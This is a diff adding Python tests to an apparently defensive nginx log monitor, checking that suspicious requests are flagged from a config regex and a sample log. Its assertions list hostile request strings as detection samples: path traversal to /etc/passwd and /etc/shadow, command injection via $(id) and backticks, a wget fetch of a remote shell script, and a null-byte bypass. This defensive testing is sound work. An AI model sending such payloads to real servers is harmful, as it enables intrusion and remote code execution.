@@ -340,3 +340,97 @@ nginx:
         conn.close()
 
         assert "repeat_banned: yes" in report
+
+
+def test_main_marks_regex_suspicious_nginx_request_from_config() -> None:
+    """Regex-configured nginx patterns should produce suspicious events."""
+    with tempfile.TemporaryDirectory() as tmpdir:
+        db_path = Path(tmpdir) / "test.db"
+        config_path = Path(tmpdir) / "config.yaml"
+        nginx_log = Path(tmpdir) / "nginx.log"
+
+        config_path.write_text(
+            """
+nginx:
+  suspicious_paths:
+    - "/wp-login.php"
+  suspicious_path_patterns:
+    - '(?:^|/)\\.\\.(?:/|%2f|%252f|\\\\)'
+"""
+        )
+        nginx_log.write_text(
+            '185.10.10.1 - - [25/Mar/2026:10:00:02 +0000] "GET /../../etc/passwd HTTP/1.1" 404 144 "-" "Mozilla/5.0"\n'
+        )
+
+        import sys
+
+        original_argv = sys.argv
+        try:
+            sys.argv = [
+                "main.py",
+                "--config",
+                str(config_path),
+                "--db-path",
+                str(db_path),
+                "--nginx-log",
+                str(nginx_log),
+            ]
+            main()
+        finally:
+            sys.argv = original_argv
+
+        conn = get_connection(str(db_path))
+        event = conn.execute(
+            """
+            SELECT event_type, path
+            FROM events
+            ORDER BY timestamp ASC, id ASC
+            """
+        ).fetchone()
+        conn.close()
+
+        assert event is not None
+        assert event[0] == "nginx_suspicious_request"
+        assert event[1] == "/../../etc/passwd"
+
+
+def test_main_sample_nginx_log_catches_regex_driven_probes() -> None:
+    """Default sample nginx log should exercise regex suspicious matching."""
+    with tempfile.TemporaryDirectory() as tmpdir:
+        db_path = Path(tmpdir) / "test.db"
+
+        import sys
+
+        original_argv = sys.argv
+        try:
+            sys.argv = [
+                "main.py",
+                "--db-path",
+                str(db_path),
+                "--nginx-log",
+                "sample_logs/nginx-access.log.sample",
+            ]
+            main()
+        finally:
+            sys.argv = original_argv
+
+        conn = get_connection(str(db_path))
+        rows = conn.execute(
+            """
+            SELECT path
+            FROM events
+            WHERE event_type = 'nginx_suspicious_request'
+              AND src_ip = '203.0.113.200'
+            ORDER BY timestamp ASC, id ASC
+            """
+        ).fetchall()
+        conn.close()
+
+        suspicious_paths = {row[0] for row in rows}
+        assert "/../../etc/passwd" in suspicious_paths
+        assert "/%2e%2e/%2e%2e/%2e%2e/etc/shadow" in suspicious_paths
+        assert "/cgi-bin/status?cmd=%24%28id%29" in suspicious_paths
+        assert "/index.php?exec=%60uname%60" in suspicious_paths
+        assert "/search?q=1;wget${IFS}http://198.51.100.9/p.sh" in suspicious_paths
+        assert "/download?file=backup.tar.gz%00.php" in suspicious_paths
+        assert "/db/backup-2026-03-25.sql" in suspicious_paths
